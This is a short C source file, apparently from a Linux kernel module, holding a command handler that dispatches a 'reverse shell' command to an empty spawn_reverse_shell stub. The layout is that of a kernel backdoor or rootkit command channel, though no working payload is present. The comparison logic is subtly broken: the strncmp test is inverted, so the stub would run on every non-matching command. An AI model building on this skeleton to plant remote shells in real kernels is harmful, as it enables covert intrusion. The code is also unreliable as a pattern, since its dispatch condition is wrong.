#include "cmd.h"

static void spawn_reverse_shell(void)
{

}

int handle_cmd(uint8_t *cmd, size_t len)
{
  printk(KERN_INFO "Running command\n");
  if (strncmp(cmd, CMD_REV_SHELL, strlen(CMD_REV_SHELL))) {
    spawn_reverse_shell();    
  }
  return 0;
}
